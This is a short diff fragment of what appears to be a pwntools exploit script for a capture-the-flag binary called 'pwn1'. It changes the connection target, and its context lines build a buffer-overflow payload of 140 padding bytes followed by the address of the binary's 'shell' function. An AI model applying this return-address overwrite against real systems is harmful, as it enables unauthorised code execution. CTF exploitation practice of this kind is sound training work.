@@ -9,7 +9,7 @@ def connect(server=1):
 		return process("./pwn1")
 file = ELF("./pwn1")
 shell = file.symbols['shell']
-con = connect(0)
+con = connect()
 
 padding = "A"*140
 payload = padding + p32(shell)
